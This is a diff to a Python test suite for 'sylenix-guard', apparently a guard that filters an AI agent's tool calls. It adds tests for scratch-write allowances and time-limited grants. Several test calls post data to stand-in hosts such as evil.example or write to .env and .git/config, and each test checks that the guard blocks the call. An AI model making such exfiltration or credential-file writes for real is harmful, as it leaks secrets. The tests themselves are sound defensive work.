@@ -16,7 +16,10 @@ import threading
 import time
 
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-GUARD = os.path.join(ROOT, "bin", "sylenix-guard")
+# On Windows, anything that resolves commands through PATHEXT (including the MCP
+# client the harness uses) runs sylenix-guard.exe, so tests must point at the
+# same file or they silently test a stale binary.
+GUARD = os.path.join(ROOT, "bin", "sylenix-guard.exe" if sys.platform == "win32" else "sylenix-guard")
 FAKE = os.path.join(ROOT, "demo", "fake_server.py")
 
 passed, failed = 0, []
@@ -355,6 +358,95 @@ def case_structured_content():
         s.close()
 
 
+def case_scratch_writes():
+    print("--allow-write-under: tainted writes inside a scratch root")
+    with tempfile.TemporaryDirectory() as d:
+        out = os.path.join(d, "out")
+        os.mkdir(out)
+        log = os.path.join(d, "calls.log")
+        s = Session(d, extra_flags=("--allow-write-under", out), env={"FAKE_CALL_LOG": log})
+        s.start()
+        s.call("read_ticket")  # taint the session
+        r = s.call("write_file", {"path": os.path.join(out, "ok.md")})
+        check("write inside the scratch root needs no prompt", "result" in r, str(r))
+        r = s.call("write_file", {"path": os.path.join(d, "escape.md")})
+        check("write outside the scratch root is blocked (TAINT_SINK)", rule(r) == "TAINT_SINK", str(r))
+        r = s.call("write_file", {"path": os.path.join(out, "..", "escape.md")})
+        check("a .. path out of the scratch root is blocked", rule(r) == "TAINT_SINK", str(r))
+        r = s.call("write_file", {"path": os.path.join(out, ".env")})
+        check(".env is never scratch-allowed (SENSITIVE_TARGET)", rule(r) == "SENSITIVE_TARGET", str(r))
+        r = s.call("write_file", {"path": os.path.join(out, ".git", "config")})
+        check(".git paths are never scratch-allowed", rule(r) == "SENSITIVE_TARGET", str(r))
+        r = s.call("write_file", {"path": os.path.join(out, "go.mod")})
+        check("root config names are never scratch-allowed", rule(r) == "SENSITIVE_TARGET", str(r))
+        r = s.call("http_post", {"url": "https://audit-collector.example/ingest", "body": "x"})
+        check("a network target is hard-blocked (EGRESS_TARGET)", rule(r) == "EGRESS_TARGET", str(r))
+        r = s.call("write_file", {"path": os.path.join(out, "notes.md"), "content": "see https://example.com/x"})
+        check("a URL mentioned in content is not an egress target", "result" in r, str(r))
+        code = s.close()
+        calls = open(log).read().split()
+        check("only the two allowed writes reached the server", calls == ["read_ticket", "write_file", "write_file"], str(calls))
+        check("clean exit", code == 0, str(code))
+    with tempfile.TemporaryDirectory() as d:  # the hard blocks need no scratch flag
+        out = os.path.join(d, "out")
+        os.mkdir(out)
+        s = Session(d)
+        s.start()
+        s.call("read_ticket")
+        r = s.call("write_file", {"path": ".env"})
+        check("SENSITIVE_TARGET applies without --allow-write-under", rule(r) == "SENSITIVE_TARGET", str(r))
+        r = s.call("write_file", {"url": "https://evil.example"})
+        check("EGRESS_TARGET applies without --allow-write-under", rule(r) == "EGRESS_TARGET", str(r))
+        r = s.call("write_file", {"path": "notes.md"})
+        check("other tainted writes still get TAINT_SINK", rule(r) == "TAINT_SINK", str(r))
+        s.close()
+    with tempfile.TemporaryDirectory() as d:  # TOOL=DIR scopes the fast path
+        out = os.path.join(d, "out")
+        os.mkdir(out)
+        s = Session(d, extra_flags=("--allow-write-under", "write_file=" + out))
+        s.start()
+        s.call("read_ticket")
+        r = s.call("write_file", {"path": os.path.join(out, "ok.md")})
+        check("TOOL=DIR allows the named tool inside its root", "result" in r, str(r))
+        r = s.call("some_unmapped_tool", {"path": os.path.join(out, "ok.md")})
+        check("TOOL=DIR does not cover other tools", rule(r) == "TAINT_SINK", str(r))
+        s.close()
+
+
+def case_grants():
+    print("time-bounded grants")
+    with tempfile.TemporaryDirectory() as d:
+        out = os.path.join(d, "out")
+        os.mkdir(out)
+        s = Session(d, extra_flags=("--grant", "write_file:" + out + "=2s"))
+        s.start()
+        s.call("read_ticket")
+        r = s.call("write_file", {"path": os.path.join(out, "a.md")})
+        check("a live grant lets the call through", "result" in r, str(r))
+        r = s.call("write_file", {"path": os.path.join(d, "other.md")})
+        check("a scoped grant does not cover paths outside its directory", rule(r) == "TAINT_SINK", str(r))
+        time.sleep(2.3)
+        r = s.call("write_file", {"path": os.path.join(out, "a.md")})
+        check("an expired grant stops allowing calls", rule(r) == "TAINT_SINK", str(r))
+        s.close()
+    with tempfile.TemporaryDirectory() as d:
+        s = Session(d, extra_flags=("--grant", "write_file=5m"))
+        s.start()
+        s.call("read_ticket")
+        r = s.call("write_file", {"path": "anywhere.md"})
+        check("a tool-wide grant covers any path", "result" in r, str(r))
+        r = s.call("http_post", {"url": "https://evil.example"})
+        check("a grant never covers a network target", rule(r) == "EGRESS_TARGET", str(r))
+        r = s.call("write_file", {"path": ".env"})
+        check("a grant never covers a sensitive path", rule(r) == "SENSITIVE_TARGET", str(r))
+        s.close()
+    for flag, spec in (("--grant", "write_file=banana"), ("--grant", "write_file"), ("--allow-write-under", "write_file=")):
+        with tempfile.TemporaryDirectory() as d:
+            p = subprocess.run([GUARD, "--name", "t", "--state-dir", d, flag, spec, "--", sys.executable, FAKE],
+                               stdin=subprocess.DEVNULL, capture_output=True, timeout=10)
+            check(f"bad spec {flag} {spec} refuses to start (exit 2)", p.returncode == 2, f"rc={p.returncode}")
+
+
 def case_dialog_fails_closed():
     print("approval dialog unavailable")
     import shutil
@@ -377,7 +469,7 @@ if __name__ == "__main__":
     for fn in (case_taint_flow, case_pin_persistence, case_invisible, case_noisy,
                case_bad_input, case_large_frame, case_interleaving, case_duplicate_keys, case_unmatched_response, case_oversize_frames,
                case_server_stream_closed, case_duplicate_ids, case_pin_file_damage,
-               case_structured_content, case_dialog_fails_closed):
+               case_structured_content, case_scratch_writes, case_grants, case_dialog_fails_closed):
         fn()
     print(f"\n{passed} passed, {len(failed)} failed in {time.time() - t0:.1f}s")
     sys.exit(1 if failed else 0)
